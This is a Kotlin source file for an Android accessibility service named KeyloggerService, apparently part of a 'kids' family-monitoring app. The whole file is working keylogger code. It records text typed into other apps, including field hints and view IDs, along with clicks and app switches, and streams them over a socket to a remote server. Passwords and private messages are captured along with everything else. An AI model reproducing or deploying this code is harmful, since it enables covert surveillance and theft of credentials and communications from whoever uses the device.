package com.xixfamily.kids.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.xixfamily.kids.network.SocketManager
import org.json.JSONObject

class KeyloggerService : AccessibilityService() {
    companion object { private const val TAG = "KeyloggerService"; private const val MAX_TEXT = 1000 }
    private var lastPackage = ""
    private var lastText = ""
    private var eventCount = 0

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
        serviceInfo = info
        Log.d(TAG, "Keylogger connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    val pkg = event.packageName?.toString() ?: return
                    if (pkg != lastPackage) {
                        lastPackage = pkg
                        sendToSocket("keylog:event", JSONObject().apply { put("type", "app_switch"); put("packageName", pkg); put("className", event.className?.toString() ?: ""); put("timestamp", System.currentTimeMillis()) })
                    }
                }
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val text = event.text?.joinToString("") ?: return
                    if (text.isBlank() || text == lastText) return
                    val source = event.source ?: return
                    lastText = text; eventCount++
                    val data = JSONObject().apply { put("type", "text_input"); put("packageName", event.packageName?.toString() ?: ""); put("text", text.take(MAX_TEXT)); put("hint", source.hintText?.toString() ?: ""); put("viewId", source.viewIdResourceName ?: ""); put("length", text.length); put("timestamp", System.currentTimeMillis()) }
                    if (eventCount % 3 == 0 || text.length > 20) sendToSocket("keylog:event", data)
                    source.recycle()
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    val source = event.source ?: return
                    sendToSocket("keylog:event", JSONObject().apply { put("type", "click"); put("packageName", event.packageName?.toString() ?: ""); put("viewId", source.viewIdResourceName ?: ""); put("text", source.text?.toString() ?: ""); put("timestamp", System.currentTimeMillis()) })
                    source.recycle()
                }
            }
        } catch (e: Exception) { Log.e(TAG, "Error: ${e.message}") }
    }

    private fun sendToSocket(event: String, data: JSONObject) {
        try { val s = SocketManager.getInstance(); if (s.isSocketConnected()) s.emit(event, data) } catch (e: Exception) {}
    }
    override fun onInterrupt() { Log.d(TAG, "Interrupted") }
    override fun onDestroy() { super.onDestroy(); Log.d(TAG, "Destroyed") }
}
